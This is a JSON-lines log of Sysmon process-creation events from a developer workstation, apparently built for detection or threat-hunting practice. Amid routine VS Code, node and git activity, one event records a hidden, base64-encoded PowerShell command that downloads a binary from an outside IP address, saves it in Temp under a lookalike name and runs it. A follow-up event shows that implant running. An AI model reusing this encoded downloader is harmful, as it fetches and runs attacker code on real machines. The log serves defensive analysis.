{"EventID":1,"UtcTime":"2026-03-09 12:01:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-code-main-000000000001}","ProcessId":5001,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe","Description":"Visual Studio Code","Product":"Visual Studio Code","Company":"Microsoft Corporation","OriginalFileName":"Code.exe","CommandLine":"\"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-explorer-000000000004}","ParentProcessId":4800,"ParentImage":"C:\\Windows\\explorer.exe"}
{"EventID":1,"UtcTime":"2026-03-09 12:16:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000005}","ProcessId":5004,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 12:41:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000006}","ProcessId":5005,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 12:45:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-ps-legit-000000000020}","ProcessId":5019,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Description":"Windows PowerShell","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-winterm-000000000021}","ParentProcessId":5120,"ParentImage":"C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe"}
{"EventID":1,"UtcTime":"2026-03-09 13:06:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000007}","ProcessId":5006,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 13:31:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000008}","ProcessId":5007,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 13:45:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-ps-legit-000000000022}","ProcessId":5020,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Description":"Windows PowerShell","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-winterm-000000000023}","ParentProcessId":5120,"ParentImage":"C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe"}
{"EventID":1,"UtcTime":"2026-03-09 13:56:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000009}","ProcessId":5008,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 14:00:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-git-000000000030}","ProcessId":5024,"Image":"C:\\Program Files\\Git\\cmd\\git.exe","Description":"","Product":"","Company":"The Git Project","OriginalFileName":"git.exe","CommandLine":"\"git.exe\" fetch origin","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 14:00:12.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-ps-evil-000000000002}","ProcessId":5002,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Description":"Windows PowerShell","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABiAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYgAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABXAGkAbgA2ADQAOwAgAHgANgA0ACkAIgApADsAJABwAD0AIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAdgBjAGgAbwBzAHQALQBoAGUAYQBsAHQAaAAuAGUAeABlACIAOwAkAGIALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADUALgA3ADMALgAyADEANwAvAGEAcwBzAGUAdABzAC8AaAAuAGIAaQBuACIALAAkAHAAKQA7AFUAbgBiAGwAbwBjAGsALQBGAGkAbABlACAALQBQAGEAdABoACAAJABwADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAJABwACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=","CurrentDirectory":"C:\\Users\\jane.roberts\\projects\\cicd-signing\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 14:00:28.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-implant-000000000003}","ProcessId":5003,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Temp\\svchost-health.exe","Description":"","Product":"","Company":"","OriginalFileName":"svchost-health.exe","CommandLine":"\"C:\\Users\\jane.roberts\\AppData\\Local\\Temp\\svchost-health.exe\"","CurrentDirectory":"C:\\Users\\jane.roberts\\AppData\\Local\\Temp\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"SHA256=A3F5C8E9B2D1F4A7C6E3B8D5F2A9C7E4B1D8F5A2C9E6B3D0F7A4C1E8B5D2F9A6","ParentProcessGuid":"{v3-ps-evil-000000000002}","ParentProcessId":5002,"ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
{"EventID":1,"UtcTime":"2026-03-09 14:21:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000010}","ProcessId":5009,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 14:45:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-ps-legit-000000000024}","ProcessId":5021,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Description":"Windows PowerShell","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-winterm-000000000025}","ParentProcessId":5120,"ParentImage":"C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe"}
{"EventID":1,"UtcTime":"2026-03-09 14:46:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000011}","ProcessId":5010,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 14:50:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-git-000000000031}","ProcessId":5025,"Image":"C:\\Program Files\\Git\\cmd\\git.exe","Description":"","Product":"","Company":"The Git Project","OriginalFileName":"git.exe","CommandLine":"\"git.exe\" fetch origin","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 15:11:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000012}","ProcessId":5011,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 15:36:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000013}","ProcessId":5012,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 15:40:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-git-000000000032}","ProcessId":5026,"Image":"C:\\Program Files\\Git\\cmd\\git.exe","Description":"","Product":"","Company":"The Git Project","OriginalFileName":"git.exe","CommandLine":"\"git.exe\" fetch origin","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 15:45:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-ps-legit-000000000026}","ProcessId":5022,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Description":"Windows PowerShell","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-winterm-000000000027}","ParentProcessId":5120,"ParentImage":"C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe"}
{"EventID":1,"UtcTime":"2026-03-09 16:01:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000014}","ProcessId":5013,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 16:26:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000015}","ProcessId":5014,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 16:30:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-git-000000000033}","ProcessId":5027,"Image":"C:\\Program Files\\Git\\cmd\\git.exe","Description":"","Product":"","Company":"The Git Project","OriginalFileName":"git.exe","CommandLine":"\"git.exe\" fetch origin","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 16:45:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-ps-legit-000000000028}","ProcessId":5023,"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Description":"Windows PowerShell","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-winterm-000000000029}","ParentProcessId":5120,"ParentImage":"C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.19.10573.0_x64\\WindowsTerminal.exe"}
{"EventID":1,"UtcTime":"2026-03-09 16:51:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000016}","ProcessId":5015,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 17:16:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000017}","ProcessId":5016,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 17:20:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-git-000000000034}","ProcessId":5028,"Image":"C:\\Program Files\\Git\\cmd\\git.exe","Description":"","Product":"","Company":"The Git Project","OriginalFileName":"git.exe","CommandLine":"\"git.exe\" fetch origin","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 17:41:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000018}","ProcessId":5017,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
{"EventID":1,"UtcTime":"2026-03-09 18:06:00.000","Computer":"DEV-WS03","host.ip":"10.42.10.45","ProcessGuid":"{v3-node-000000000019}","ProcessId":5018,"Image":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\resources\\app\\node_modules.asar.unpacked\\node-pty\\build\\Release\\node.exe","Description":"Node.js JavaScript Runtime","Product":"Node.js","Company":"OpenJS Foundation","OriginalFileName":"node.exe","CommandLine":"\"node.exe\" --inspect-port=0 \"c:\\Users\\jane.roberts\\.vscode\\extensions\\ms-python.python-2026.0.0\\out\\server.js\"","CurrentDirectory":"C:\\Users\\jane.roberts\\","User":"CORP.LOCAL\\jane.roberts","IntegrityLevel":"Medium","Hashes":"","ParentProcessGuid":"{v3-code-main-000000000001}","ParentProcessId":5001,"ParentImage":"C:\\Users\\jane.roberts\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"}
